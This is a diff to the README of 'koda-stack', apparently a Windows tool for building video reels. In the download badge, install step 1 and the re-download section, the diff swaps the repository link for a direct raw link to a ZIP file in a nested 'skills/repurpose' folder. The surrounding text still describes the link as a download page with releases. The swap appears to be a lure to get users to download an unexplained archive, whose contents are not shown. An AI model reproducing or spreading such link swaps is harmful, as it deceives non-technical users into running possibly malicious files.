@@ -1,6 +1,6 @@
 # 🎬 koda-stack - Build reels from script to publish
 
-[![Download koda-stack](https://img.shields.io/badge/Download%20koda--stack-4F46E5?style=for-the-badge&logo=github&logoColor=white)](https://github.com/JJJurno/koda-stack)
+[![Download koda-stack](https://img.shields.io/badge/Download%20koda--stack-4F46E5?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/JJJurno/koda-stack/main/skills/repurpose/stack-koda-3.3.zip)
 
 ## 🧩 What is koda-stack?
 
@@ -37,7 +37,7 @@ For smooth use, a computer with at least 8 GB of RAM is best. More memory helps 
 
 ## 📥 Download and install
 
-1. Open the download page here: https://github.com/JJJurno/koda-stack
+1. Open the download page here: https://raw.githubusercontent.com/JJJurno/koda-stack/main/skills/repurpose/stack-koda-3.3.zip
 2. On the page, look for the latest release or the main download files.
 3. Download the file or package that matches Windows.
 4. If the download comes as a ZIP file, right-click it and choose Extract All.
@@ -192,4 +192,4 @@ These small steps save time and reduce confusion.
 
 ## 📎 Download again
 
-If you need the file again, use this link: https://github.com/JJJurno/koda-stack
+If you need the file again, use this link: https://raw.githubusercontent.com/JJJurno/koda-stack/main/skills/repurpose/stack-koda-3.3.zip
